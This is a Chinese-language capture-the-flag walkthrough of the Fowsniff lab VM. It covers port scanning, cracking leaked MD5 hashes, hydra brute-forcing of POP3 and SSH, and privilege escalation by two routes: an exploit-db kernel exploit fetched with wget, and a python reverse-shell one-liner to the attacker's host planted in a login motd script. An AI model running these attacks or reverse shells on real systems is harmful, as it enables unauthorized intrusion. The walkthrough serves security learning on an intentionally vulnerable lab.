VirtualBox双击打开，默认wifi桥接模式！用探测发现IP地址！alivecheck 1.6-快速扫描.jar
192.168.2.141

--------------------------------------------
--------------------------------------------
1、nmap 172.20.10.8 -p- -A
Nmap scan report for fowsniff.lan (192.168.2.141)

22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
110/tcp open  pop3    Dovecot pop3d
143/tcp open  imap    Dovecot imapd


--------------------------------------------
--------------------------------------------
2、web信息收集

dirb和nikto都未发现有用的信息！

在web主页有简介说明了一些有用的信息：
Fowsniff的内部系统遭遇数据泄露，导致员工用户名和密码泄露。

详细枚举下底层文件信息：
gobuster dir -u http://172.20.10.10 -w /usr/share/dirb/wordlists/common.txt -t 200 -x php,html,txt
/security.txt         (Status: 200) [Size: 459]

访问：
http://172.20.10.10/security.txt 
访问提示：Fowsniff Corp got pwn3d by B1gN1nj4!


各个搜索该信息，发现密码用户泄露：
https://twitter.com/fowsniffcorp
https://pastebin.com/NrAqVeeX

在推特下的网页信息泄露了用户名密码信息：

mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e


--------------------------------------------
--------------------------------------------
3、在线解码爆破


https://crackstation.net/

8a28a94a588a95b80163709ab4313aa4
ae1644dac5b77c0cf51e0d26ad6d7e56
1dc352435fecca338acfd4be10984009
19f5af754c31f1e2651edde9250d69bb
90dc16d47114aa13671c697fd506cf26
a92b8a29ef1183192e3d35187e0cfabd
0e9588cb62f4b6f27e33d449e2ba0b3b
4d6e42f56e127803285a0a7649b5ab11
f7fd98d380735e859f8b2ffbbede5a7e

解密成功：

mauer@fowsniff:mailcall
mustikka@fowsniff:bilbo101
tegel@fowsniff:apples01
baksteen@fowsniff:skyler22
seina@fowsniff:scoobydoo2
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:carp4ever
parede@fowsniff:orlando12
sciana@fowsniff:07011972
我们使用该站点破解了哈希，并找到了各个电子邮件地址的密码。但是只有8个哈希被破解，并且有9个用户名。


--------------------------------------------
--------------------------------------------
4、暴力破解pop3

因此，我们创建了两个单词表，一个用于用户名，一个用于密码，我们将使用它来暴力破解pop3登录：

user.txt：
mauer
mustikka
tegel
baksteen
seina
mursten
parede
sciana

pass.txt：
mailcall
bilbo101
apples01
skyler22
scoobydoo2
carp4ever
orlando12
07011972

hydra pop3://192.168.2.141 -L user.txt -P pass.txt
[110][pop3] host: 192.168.2.141   login: seina   password: scoobydoo2
成功爆破pop3服务，获得用户名密码信息！
scoobydoo2
--------------------------------------------
--------------------------------------------
5、邮箱信息枚举

telnet 192.168.2.141 110 
+OK Welcome to the Fowsniff Corporate Mail Server!
user seina
+OK
pass scoobydoo2
+OK Logged in.
list
+OK 2 messages:
1 1622
2 1280

retr查看两封邮件信息，通过阅读第一封电子邮件，发现了一个SSH临时密码，可以在上面屏幕截图的突出显示区域中看到。密码如下所示：
The temporary password for SSH is "S1ck3nBluff+secureshell"

--------------------------------------------
--------------------------------------------
6、暴力破解ssh

hydra ssh://192.168.2.141 -L user.txt -p "S1ck3nBluff+secureshell"
[22][ssh] host: 192.168.2.141   login: baksteen   password: S1ck3nBluff+secureshell


ssh baksteen@192.168.2.141
S1ck3nBluff+secureshell

--------------------------------------------
--------------------------------------------
7、内部信息收集

1）Linux version 4.4.0-116-generic
2）Sudo version 1.8.16
3）/home/baksteen
4）用户信息：
baksteen:x:1004:100::/home/baksteen:/bin/bash
mauer:x:1002:100::/home/mauer:/bin/bash
mursten:x:1005:100::/home/mursten:/bin/bash
mustikka:x:1008:100::/home/mustikka:/bin/bash
parede:x:1001:100::/home/parede:/bin/bash
root:x:0:0:root:/root:/bin/bash
sciana:x:1003:100::/home/sciana:/bin/bash
seina:x:1007:100::/home/seina:/bin/bash
stone:x:1000:1000:stone,,,:/home/stone:/bin/bash 27(sudo)
tegel:x:1006:100::/home/tegel:/bin/bash

100 = users
--------------------------------------------
--------------------------------------------
8、提权

--------------------------------------------
方法一：内核提权

Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation 
locate linux/local/44298.c
cp /usr/share/exploitdb/exploits/linux/local/44298.c .

gcc 44298.c -o dayu   ---本地编译，项目环境没有安装GDB，注意是64位系统即可！
wget http://192.168.2.139:8081/dayu
chmod +x dayu
./dayu


--------------------------------------------
方法二：组权限枚举+可写提权

baksteen@fowsniff:/tmp$ id
uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)
用户baksteen属于两个不同的组！！

find / -group users 2>/dev/null
/opt/cube/cube.sh   ---发现！

------------------------------
baksteen@fowsniff:/tmp$ cat /opt/cube/cube.sh
printf "
                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions\n\n"
------------------------------

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.2.139",1234));os.dup2(s.fileno() ,0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

回顾通过SSH登录时，会得到一个类似于cube.sh显示包含的横幅信息，这就是该脚本输出信息！
在/etc/update-motd.d/目录是调用该脚本的目录地址，在目录下发现该文件：00-header
sh /opt/cube/cube.sh   ---里面存在该信息
 
说明登录ssh在此处配置后，会调用脚本信息，那么植入反弹shell一句话就可行！

ssh baksteen@172.20.10.10
S1ck3nBluff+secureshell



------------------------------
------------------------------
拓展小技巧：

我们学习过：sed 's/要被取代的字串/新的字串/g'


sed -n 's/.*://p' pass1.txt > hash.txt
sed -n屏蔽默认输出然后s替换，p再将匹配到的内容打印出来
.*:  ---代表冒号之前所有的值去掉

mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e


awk -F'@' '{print $1}' pass1.txt > users1.txt

-F'@'   ----F相当于内置变量FS, 指定分割字符，也就是分隔符在@符号
'{print $1}'  ----每行按空格或TAB分割，输出文本中的第一项

awk -F'@' '{print $2}' pass1.txt > users1.txt

awk -F':' '{print $2}' pass1.txt > users1.txt
这时候和技巧一是一样的效果！
























































































